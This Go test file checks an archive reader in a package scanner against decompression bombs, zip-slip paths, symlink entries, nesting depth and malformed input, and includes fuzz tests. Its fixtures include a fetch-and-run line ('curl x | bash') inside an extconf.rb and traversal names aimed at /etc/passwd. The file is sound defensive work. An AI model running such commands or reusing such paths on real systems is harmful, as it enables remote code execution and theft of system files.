package payload

import (
	"archive/tar"
	"archive/zip"
	"bytes"
	"compress/gzip"
	"errors"
	"io/fs"
	"testing"
	"testing/quick"
)

// --- in-memory archive builders (no disk, no network) ---

type entry struct {
	name    string
	body    []byte
	typ     byte
	symlink bool // zip only
}

func tarBytes(entries []entry) []byte {
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	for _, e := range entries {
		typ := e.typ
		if typ == 0 {
			typ = tar.TypeReg
		}
		hdr := &tar.Header{Name: e.name, Typeflag: typ, Size: int64(len(e.body)), Mode: 0o644}
		if typ == tar.TypeSymlink || typ == tar.TypeLink {
			hdr.Linkname = "target"
			hdr.Size = 0
		}
		_ = tw.WriteHeader(hdr)
		if hdr.Size > 0 {
			_, _ = tw.Write(e.body)
		}
	}
	_ = tw.Close()
	return buf.Bytes()
}

func gzipBytes(b []byte) []byte {
	var buf bytes.Buffer
	gw := gzip.NewWriter(&buf)
	_, _ = gw.Write(b)
	_ = gw.Close()
	return buf.Bytes()
}

func tarGz(entries []entry) []byte { return gzipBytes(tarBytes(entries)) }

// gemBytes builds a .gem: an outer (uncompressed) tar whose data.tar.gz member
// carries the inner tree (depth-2 nesting).
func gemBytes(inner []entry) []byte {
	dataTarGz := tarGz(inner)
	return tarBytes([]entry{
		{name: "metadata.gz", body: []byte("---")},
		{name: "data.tar.gz", body: dataTarGz},
		{name: "checksums.yaml.gz", body: []byte("---")},
	})
}

func zipBytes(entries []entry) []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for _, e := range entries {
		fh := &zip.FileHeader{Name: e.name}
		if e.symlink {
			fh.SetMode(fs.ModeSymlink | 0o777)
		} else {
			fh.SetMode(0o644)
		}
		w, _ := zw.CreateHeader(fh)
		_, _ = w.Write(e.body)
	}
	_ = zw.Close()
	return buf.Bytes()
}

func npmInteresting(p string) bool  { return interestingFor("npm")(p) }
func gemInterestingP(p string) bool { return interestingFor("gem")(p) }

// --- happy path ---

func TestReadArchive_TarGzHappyPath(t *testing.T) {
	pkg := `{"name":"x","scripts":{"postinstall":"node-gyp rebuild"}}`
	raw := tarGz([]entry{
		{name: "package/package.json", body: []byte(pkg)},
		{name: "package/index.js", body: []byte("module.exports={}")}, // not interesting
	})
	out, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, DefaultLimits(), npmInteresting)
	if err != nil {
		t.Fatal(err)
	}
	if string(out["package/package.json"]) != pkg {
		t.Fatalf("package.json not read: %v", out)
	}
	if _, ok := out["package/index.js"]; ok {
		t.Error("non-allowlisted file was buffered (should be skipped, §V4.4)")
	}
}

func TestReadArchive_ZipHappyPath(t *testing.T) {
	raw := zipBytes([]entry{{name: "pkg/setup.py", body: []byte("print('hi')")}})
	out, err := ReadArchive(bytes.NewReader(raw), FormatZip, DefaultLimits(), interestingFor("pypi"))
	if err != nil {
		t.Fatal(err)
	}
	if string(out["pkg/setup.py"]) != "print('hi')" {
		t.Fatalf("setup.py not read: %v", out)
	}
}

func TestReadArchive_GemNestedDepth2(t *testing.T) {
	raw := gemBytes([]entry{{name: "ext/foo/extconf.rb", body: []byte("system('curl x | bash')")}})
	out, err := ReadArchive(bytes.NewReader(raw), FormatGem, DefaultLimits(), gemInterestingP)
	if err != nil {
		t.Fatal(err)
	}
	if _, ok := out["ext/foo/extconf.rb"]; !ok {
		t.Fatalf("nested extconf.rb not read: %v", out)
	}
}

// --- §V4.1 decompression-bomb defenses ---

func TestReadArchive_DecompressionBomb_TotalCap(t *testing.T) {
	// A single interesting file far larger than the total cap: the cappedReader
	// wall stops it (PA-1 / PA-6).
	lim := Limits{MaxTotalUncompressed: 1024, MaxEntries: 100, MaxPerEntry: 8 << 20, MaxDepth: 3}
	raw := tarGz([]entry{{name: "package/package.json", body: bytes.Repeat([]byte{'A'}, 64<<10)}})
	_, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, lim, npmInteresting)
	if !errors.Is(err, ErrDecompressionCap) {
		t.Fatalf("want ErrDecompressionCap, got %v", err)
	}
}

func TestReadArchive_ZipBomb_EntryCountCap(t *testing.T) {
	lim := Limits{MaxTotalUncompressed: 1 << 20, MaxEntries: 5, MaxPerEntry: 1 << 20, MaxDepth: 3}
	var es []entry
	for i := 0; i < 50; i++ {
		es = append(es, entry{name: "package/f" + itoaT(i) + ".txt", body: []byte("x")})
	}
	raw := tarGz(es)
	_, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, lim, npmInteresting)
	if !errors.Is(err, ErrEntryCap) {
		t.Fatalf("want ErrEntryCap, got %v", err)
	}
}

func TestReadArchive_PerEntryCap(t *testing.T) {
	lim := Limits{MaxTotalUncompressed: 1 << 20, MaxEntries: 100, MaxPerEntry: 1000, MaxDepth: 3}
	raw := tarGz([]entry{{name: "package/package.json", body: bytes.Repeat([]byte{'A'}, 5000)}})
	_, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, lim, npmInteresting)
	if !errors.Is(err, ErrPerEntryCap) {
		t.Fatalf("want ErrPerEntryCap, got %v", err)
	}
}

// --- §V4.2 zip-slip / path-traversal ---

func TestReadArchive_ZipSlip_TarRejected(t *testing.T) {
	for _, name := range []string{"../../etc/evil", "/etc/passwd", "package/../../x"} {
		raw := tarGz([]entry{{name: name, body: []byte("x")}})
		_, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, DefaultLimits(), func(string) bool { return true })
		if !errors.Is(err, ErrPathTraversal) {
			t.Fatalf("name %q: want ErrPathTraversal, got %v", name, err)
		}
	}
}

// --- §V4.3 symlink / hardlink / device rejection ---

func TestReadArchive_SymlinkRejected(t *testing.T) {
	for _, typ := range []byte{tar.TypeSymlink, tar.TypeLink, tar.TypeChar, tar.TypeBlock, tar.TypeFifo} {
		raw := tarGz([]entry{{name: "package/link", typ: typ}})
		_, err := ReadArchive(bytes.NewReader(raw), FormatTarGz, DefaultLimits(), func(string) bool { return true })
		if !errors.Is(err, ErrLinkEntry) {
			t.Fatalf("typeflag %d: want ErrLinkEntry, got %v", typ, err)
		}
	}
}

func TestReadArchive_ZipSymlinkRejected(t *testing.T) {
	raw := zipBytes([]entry{{name: "pkg/evil", body: []byte("/etc/passwd"), symlink: true}})
	_, err := ReadArchive(bytes.NewReader(raw), FormatZip, DefaultLimits(), func(string) bool { return true })
	if !errors.Is(err, ErrLinkEntry) {
		t.Fatalf("want ErrLinkEntry for zip symlink, got %v", err)
	}
}

// --- §V4.5 nested-archive depth cap ---

func TestReadArchive_DepthCap(t *testing.T) {
	// A gem recurses to depth 2 (outer tar → data.tar.gz). MaxDepth=1 must stop
	// the recursion (PA-7).
	lim := Limits{MaxTotalUncompressed: 1 << 20, MaxEntries: 100, MaxPerEntry: 1 << 20, MaxDepth: 1}
	raw := gemBytes([]entry{{name: "ext/foo/extconf.rb", body: []byte("x")}})
	_, err := ReadArchive(bytes.NewReader(raw), FormatGem, lim, gemInterestingP)
	if !errors.Is(err, ErrDepthCap) {
		t.Fatalf("want ErrDepthCap, got %v", err)
	}
}

// --- §V4.7 parser-DoS / malformed archive → fail-closed ---

func TestReadArchive_MalformedFailsClosed(t *testing.T) {
	// Not gzip at all.
	_, err := ReadArchive(bytes.NewReader([]byte("not a gzip stream")), FormatTarGz, DefaultLimits(), func(string) bool { return true })
	if !errors.Is(err, ErrParse) {
		t.Fatalf("want ErrParse for malformed tar.gz, got %v", err)
	}
	// Valid gzip, garbage tar.
	_, err = ReadArchive(bytes.NewReader(gzipBytes([]byte("garbage-not-tar-data"))), FormatTarGz, DefaultLimits(), func(string) bool { return true })
	if err == nil {
		t.Fatal("garbage tar should fail closed")
	}
}

func TestReadArchive_UnknownFormatFailsClosed(t *testing.T) {
	_, err := ReadArchive(bytes.NewReader([]byte("x")), FormatUnknown, DefaultLimits(), func(string) bool { return true })
	if !errors.Is(err, ErrUnknownFormat) {
		t.Fatalf("want ErrUnknownFormat, got %v", err)
	}
}

// --- §V4.9 no-execution / robustness property ---

// TestProperty_ReadArchiveNeverPanics: ReadArchive over ARBITRARY attacker bytes
// in any format never panics and never hangs (it returns). This is the
// robustness half of the no-execution invariant — the function only ever reads
// bytes; it has no code path that executes payload content. Panics (a hostile
// archive crashing a decoder) are recovered to a fail-closed error, so the
// property holds by construction.
func TestProperty_ReadArchiveNeverPanics(t *testing.T) {
	formats := []Format{FormatTarGz, FormatTarBz2, FormatZip, FormatGem, FormatTar}
	f := func(b []byte) bool {
		for _, fm := range formats {
			// Must return (no panic, no hang) — value ignored.
			_, _ = ReadArchive(bytes.NewReader(b), fm, DefaultLimits(), func(string) bool { return true })
		}
		return true
	}
	if err := quick.Check(f, &quick.Config{MaxCount: 1500}); err != nil {
		t.Fatal(err)
	}
}

// FuzzReadArchive drives the untrusted archive/decompression decoder (the
// second required fuzz target, delta §V7) with arbitrary bytes across every
// format. A crash blocks merge. The invariant: ReadArchive always RETURNS (a
// value or a fail-closed error) — it never panics, never hangs, never writes to
// disk, never executes anything.
func FuzzReadArchive(f *testing.F) {
	f.Add(tarGz([]entry{{name: "package/package.json", body: []byte(`{"scripts":{}}`)}}))
	f.Add(zipBytes([]entry{{name: "pkg/setup.py", body: []byte("x")}}))
	f.Add(gemBytes([]entry{{name: "ext/x/extconf.rb", body: []byte("x")}}))
	f.Add([]byte("not an archive"))
	f.Add(gzipBytes([]byte("garbage")))
	formats := []Format{FormatTarGz, FormatTarBz2, FormatZip, FormatGem, FormatTar}
	f.Fuzz(func(t *testing.T, b []byte) {
		for _, fm := range formats {
			out, err := ReadArchive(bytes.NewReader(b), fm, DefaultLimits(), func(string) bool { return true })
			// On success the map must be non-nil (never a nil map with nil err).
			if err == nil && out == nil {
				t.Fatalf("format %v: nil map with nil error", fm)
			}
		}
	})
}

func itoaT(i int) string {
	if i == 0 {
		return "0"
	}
	var b [20]byte
	p := len(b)
	for i > 0 {
		p--
		b[p] = byte('0' + i%10)
		i /= 10
	}
	return string(b[p:])
}
